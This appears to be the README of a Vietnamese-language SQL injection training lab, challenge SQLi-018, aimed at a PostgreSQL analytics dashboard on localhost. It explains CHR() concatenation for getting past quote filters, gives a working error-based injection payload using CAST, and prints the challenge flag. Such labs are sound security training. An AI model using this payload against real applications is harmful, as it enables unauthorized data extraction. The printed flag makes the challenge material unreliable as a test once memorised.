# SQLi-018: PostgreSQL CHR() Concatenation Error-based

## 🎯 Mục Tiêu
Sử dụng **CHR()** concatenation để bypass filters và extract data trong PostgreSQL.

## 📝 Kịch Bản
Analytics dashboard với PostgreSQL backend.

**URL:** `http://localhost:5018/analytics?id=1`

## 🎓 Kiến Thức
```sql
-- CHR concatenation để tránh quotes
SELECT CHR(65)||CHR(66)||CHR(67)  -- Returns 'ABC'

-- Error-based extraction với casting
' AND 1=CAST((SELECT CHR(70)||CHR(76)||CHR(65)||CHR(71)) AS int)--
```

## 🏁 Flag
`FLAG{chr_c0nc4t_p0stgr3sql}`
